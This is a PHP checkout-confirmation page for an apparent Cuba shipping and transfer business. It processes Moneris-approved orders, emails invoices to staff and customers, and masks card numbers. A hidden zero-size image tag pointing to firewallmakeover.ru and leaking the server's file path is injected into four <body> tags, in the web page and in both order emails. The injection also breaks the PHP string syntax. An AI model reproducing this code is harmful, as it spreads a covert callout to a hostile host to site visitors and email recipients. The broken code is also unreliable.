<?php
/* Programme : checkout_accepted_msg.php
* Description : Gestion de la reponse en cas d'acceptation de la part de Moneris
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');

$Large =680;

if( !isset($_SESSION['Service']) ) {
	$txt = textes($_SESSION['langue']);

	$script = "<SCRIPT LANGUAGE='javascript'>\r\n";
	$script .= "M = '".$txt['bouton_deja_clique']."';\n";
	$script .= " window.alert(M);\n";
	$script .= "</SCRIPT>\n";
	echo $script;
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=accueil.php'>";
	exit();
} 

// ***** 07-12-02 Correction effectuer our une probleme détecter lorsque retour de MONERIS
// ***** La valeur de $_SESSION[$_SERVER['SERVER_NAME']] est vide ?????
//$infosClient = infos_client($_SESSION[$_SERVER['SERVER_NAME']]);
$infosClient = infos_client($_SESSION['NoContact']);

$TabModPay	= 	get_Modepaye(); 
$TxCUC_USD = get_TauxVente("CUC");  
$Symbole	=	get_Symbole($_SESSION['devise']);
$FctDate		= $_SESSION['Totaux']['DateFacture'];
$TabService	= 	get_service("");	   
$TabUnite	= 	get_unite();

// ***** Paiement de la facture au compte client
if( isset($_SESSION['NoEcr']) && $_SESSION['NoEcr'] ) {

		
	function AfficherErreur($texteMsg)
	{
	global $TabMessGen,$NomCie,$AdrCourriel;
			// ***** A TRADUIRE *****
	  echo "
	      <html>
	      <head>
	      <title>AJOUT FACTURE ERREUR</title>
	      </head>
	      <body bgcolor='#C0C0FF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	      <h2 align='center' style='margin-top: .7in'>
	      $TabMessGen[22] Checkout Accepted</h2>
	     <div align='center'>
	      <p style='margin-top: .5in'>
	      <b>$TabMessGen[23] $texteMsg</b>
	      </div>
			<div align='center'><font size=-1>
			$TabMessGen[1]
			<a href='mailto:$AdrCourriel?subject=Page Web $NomCie'>
			$TabMessGen[2]</a>
			</font></div>
			<p align='center' valign='bottom'><font size=1>
			$TabMessGen[8]		 
			$TabMessGen[3]		 
			$NomCie
			$TabMessGen[4]		  
			</p>
	      </body>
	      </html>
	  \n";
	   exit();
	} // AfficherErreur

	$NoEcrit = $_SESSION['NoEcr'];
	$Paiement = $_SESSION['Totaux']['totalpourbanque'];
	$ModePaie = $_SESSION['paiement']['ModePaye']; 
	$NoCli = $_SESSION['NoContact'];
//	echo "NoCli = ".$NoEcrit." MontantPaie = ".$Paiement." NoCli = ".$NoCli."<br>";
	include( $acces_hermes."mcrppaie.inc");
}

// ***** Le message à Antillas ( les ventes ) est en espagnol - A programmer dans parametre
$_Langue = $_SESSION['langue'];
$Devise = $_SESSION['devise'];
$_SESSION['langue'] = 'sp';  //  A programmer dans parametre
$txt = textes($_SESSION['langue']);

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	include("trsmessen.inc");
						break;
	case "fr" : 	include("trsmessfr.inc");
						break;
	default : 		include("trsmesssp.inc");  
} // switch SLangue

// Gestion des ACHATS
if( $_SESSION['Service'] == $_SERVICE_ACHAT  )  {
	$TXUSD_CAD = get_TauxVente("CAD"); 
	$TXUSD_EUR = get_TauxVente("EUR");
	$monPanier = panierInfos( $_SESSION['panier'] );
	$_SESSION['devise'] = $CurTrans = 'CUC';
	$STotal = $_SESSION['Totaux']['SousTotalCUC'];
	$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
	$Total =  $_SESSION['Totaux']['TotalCUC'];
	$Service		=	$_SESSION['Service'];
}
else {
	$TXUSD_CAD = get_TauxAchat("CAD"); 
	$TXUSD_EUR = get_TauxAchat("EUR");
	// Une commande de service TRANSFERT-COLIS
	$TabTrs		= 	get_money( "Transfert" );
	$FrTransant =	$_SESSION['transaction']['FrTransant'];
	$FrFixe		=	$_SESSION['transaction']['FrFixe'];
	$CoutUS		=	$_SESSION['transaction']['CoutUS'];
	$CurTrans	=	$_SESSION['transaction']['CurTrans'];
	$Pourcent	=	$_SESSION['transaction']['Pourcent'];
	$Plus			=	$_SESSION['transaction']['Plus'];
	$ModePaye	=	$_SESSION['paiement']['ModePaye'];
	$Total		=	$_SESSION['Totaux']['totalpourbanque']; 
	$Service		=	$_SESSION['transaction']['Service'];

	$DevDisp = $_SESSION['devise'];
	$TauxChg = get_TauxVente($DevDisp);
	if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNITÉ/UNIT") ) { 
		$Transfert	=	$TransUS		=	"";
		$Titre = $txt['sommaire_dela_livraison'];
		$recalc = "paquet_calcul.php";
		$Poids 		= 	$_SESSION['transaction']['Poids'];
		$Assurance	=	$_SESSION['transaction']['Assurance']; 
		$Douane		=	$_SESSION['transaction']['Douane'];
	}
  	elseif( $TabUnite[$Service] == "ARGENT/CASH" ) {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "transfert_calcul.php";
	}
	else {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "certificat_calcul.php";
	}
//	$EN_PANIER = 1;
}

	// Image de la devise actuel payé
	switch( $_SESSION['devise'] ) {
		case 'CUC':	$image = $entr_url.'/images/cuba.gif';
						break;
		case 'USD': $image = $entr_url.'/images/usa.gif';
						break;
		case 'EUR': $image = $entr_url.'/images/europe.gif';
						break;
		default	 : $image = $entr_url.'/images/canada.gif';
						break;
	}
	// Image de la devise USD
	$imageUSD = $entr_url.'/images/usa.gif';

	// Image de la devise de la transaction
	switch( $CurTrans ) {
		case 'CUC':	$imageTRS = $entr_url.'/images/cuba.gif';
						break;
		case 'USD': $imageTRS = $entr_url.'/images/usa.gif';
						break;
		case 'EUR': $imageTRS = $entr_url.'/images/europe.gif';
						break;
		default	 : $imageTRS = $entr_url.'/images/canada.gif';
						break;
	}

// Mode d'affichage de la factuer / commande
$_AVECENTETE = 1;
$_AVECCLIENT = 1;
$_AVECITEM = 1;
$_AVECTOTAL = 1;

//*************************************************************************************************
//**************************** PARTIE D'ANTILLAS **************************************************
//*************************************************************************************************
// ***** Le message à Antillas ( les ventes ) est en espagnol - A programmer dans parametre

$message = "
			<b><big>***** ORDEN APROBADA *****</big></b><br><br>
			Hola,<br><br>
			Una orden fue aprobada con antillas-express.com y debe ser procesada.
			Aqui estan las informaciones :<br><br>";
ob_start();
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >";
	
		// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
	if( $_SESSION['Service'] == $_SERVICE_ACHAT )
		include('facture.inc');
	else
		include('commande.inc');
echo	"
			</table>
		</td>
	</tr>
</table>
<br>
</body>
</html>";

$message .= ob_get_contents();

ob_end_clean();

if( $_SESSION['Service'] == $_SERVICE_ACHAT ) {
	$to = $param['Email_facture'];
}
else {
	$to = $param['Email_commande'];
}

$sujet = sprintf( $txt['facture_ok_sujet'], $param['nom_client'], @$_SESSION['OrderId'] );

$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Antillas Express <".$param['email_envoi'].">\r\n";
//$headers .= "Disposition-Notification-To: webmaster@antillas-express.com\r\n";

@mail($to, $sujet, $message, $headers);
//echo $message."<br>";

// Stoppe pour 5 secondes
sleep(5);
//*************************************************************************************************
//**************************** PARTIE DU CLIENT ***************************************************
//*************************************************************************************************

// ***** On remet en place la langue de défaut du client pour son courriel et sa reponse WEB
$_SESSION['langue'] = $_Langue;

$_SESSION['devise'] = $Devise;

$txt = textes($_SESSION['langue']);

$Symbole	=	get_Symbole($_SESSION['devise']);

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	include("trsmessen.inc");
						break;
	case "fr" : 	include("trsmessfr.inc");
						break;
	default : 		include("trsmesssp.inc");  
} // switch SLangue

if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNITÉ/UNIT") )
	$Titre = $txt['sommaire_dela_livraison'];
elseif( $TabUnite[$Service] == "ARGENT/CASH" ) 
	$Titre = $txt['sommaire_du_transfert'];
else 
	$Titre = $txt['sommaire_du_transfert'];

// Gestion des ACHATS
if( $_SESSION['Service'] == $_SERVICE_ACHAT  )  {
	switch( $_SESSION['devise'] ) {
		case 'CUC':	$image = $entr_url.'/images/cuba.gif';
						$STotal = $_SESSION['Totaux']['SousTotalCUC'];
						$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
						$Total =  $_SESSION['Totaux']['TotalCUC'];
						break;
		case 'USD':	$image = $entr_url.'/images/usa.gif';
						$STotal = $_SESSION['Totaux']['SousTotalUSD'];
						$Livraison = $_SESSION['Totaux']['LivraisonUSD'];
						$Total =  $_SESSION['Totaux']['TotalUSD'];
						break;
		case 'EUR':	$image = $entr_url.'/images/europe.gif';
						$STotal = $_SESSION['Totaux']['SousTotalEUR'];
						$Livraison = $_SESSION['Totaux']['LivraisonEUR'];
						$Total =  $_SESSION['Totaux']['TotalEUR'];
						break;
		default:		$image = $entr_url.'/images/canada.gif';
						$STotal = $_SESSION['Totaux']['SousTotalCAD'];
						$Livraison = $_SESSION['Totaux']['LivraisonCAD'];
						$Total =  $_SESSION['Totaux']['TotalCAD'];
						break;
	} // switch
} // Si achat

ob_start();
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >";
		// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
	if( $_SESSION['Service'] == $_SERVICE_ACHAT ){
		$Mess = $txt['Mess_carte'];
		include('facture.inc');
	}
	else {
	 // debut des types de paiement
		switch ( $_SESSION['paiement']['ModePaye']  ) {
						// VISA, MASTER, AMEX ET AUTRE
			case 5 : 
			case 6 : 
			case 7 : $Mess = $txt['Mess_carte'];
						break;
						//  MANDAT, COMPTANT, CHEQUE, INTERAC
			default:	$Mess =  sprintf( $txt['Mess_cheque_mandat'], $TabModPay[$_SESSION['paiement']['ModePaye']], $TabModPay[$_SESSION['paiement']['ModePaye']] );
						break;
		} // switch
		include('commande.inc');
	}
echo	"
			</table>
		</td>
	</tr>
</table>
<br>
</body>
</html>";

$message = ob_get_contents();

ob_end_clean();

$to=$infosClient['Courriel'];
$sujet = sprintf( $txt['facture_ok_sujet'], $param['nom_client'], @$_SESSION['OrderId'] );

@mail($to, $sujet, $message, $headers);
//echo $message."<br>";

//*************************************************************************************************
//**************************** MESSAGE AU CLIENT ***************************************************
//*************************************************************************************************

switch ( $_SESSION['paiement']['ModePaye']  ) {
	case 5 :	$LaCarte = "Visa";
				$Dev = "$ (CAD)";
				break; 
	case 6 :	$LaCarte = "Master Card";
				$Dev = "$ (CAD)";
				break; 
	case 7 : $LaCarte = "American Express";
				$Dev = "$ (CAD)";
				break;
	default:	$LaCarte = $TabModPay[$_SESSION['paiement']['ModePaye']];
				$Dev = "$ (".$_SESSION['devise'].")";
				break;
} // Si mode de paiement

//	case 'D' :	$LaCarte = "Diners Card";
$Merci = sprintf( $txt['message_merci'], $param['nom_client'] );

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<div align=center>";
	echo sprintf( $txt['msg_accepte'], $_SESSION['OrderId'], $_SESSION['Totaux']['totalpourbanque'], $Dev, $LaCarte );
	echo "<br><br>";
	echo $Mess.$Merci;
	echo "
		<br><br>".
		$txt['form_telephone']." : ".$param['telephone_client']."<br>".
		$txt['form_telecopieur']." : ".$param['fax_client']."<br>".
		$txt['form_courriel']." : <a href='mailto:".hexentities($param['email_info'])."'>".hexentities($param['email_info'])."</a></p><br><br>".
		$txt['Horaire']."<br>
		<br><br>		
		</font>
		</div>
		</td>
	</tr>
</table>";

				$script = "<script language='javascript'>\r";
				$script .= "	if( top.window.frames[0] && top.window.frames[0].Rafraichie )\r"; 
				$script .= "		top.window.frames[0].Rafraichie();\r";
				$script .= "</script>\r";
				echo $script;
				
echo "
</body>
</html>";

	if( isset($_SESSION['paiement']['trnCardNumber']) ) {
		$_SESSION['paiement']['Complet'] = true;
		$_SESSION['paiement']['reference'] = substr($_SESSION['paiement']['trnCardNumber'],0,4)."XXXXXXXX".substr($_SESSION['paiement']['trnCardNumber'],12);
		update_vente( $_SESSION['OrderId'], $_SESSION['paiement'] );
	}

	$_SESSION['paiement'] = array();
	$_SESSION['panier'] = array();

	unset($_SESSION['Frais']);
	unset($_SESSION['Totaux']);
	unset($_SESSION['transaction']);
	unset($_SESSION['paiement']);
	unset($_SESSION['panier']);
	unset($_SESSION['destinataire']);
	unset($_SESSION['Service']);
	unset($_SESSION['OrderId']);
	unset($_SESSION['NoEcr']);

?>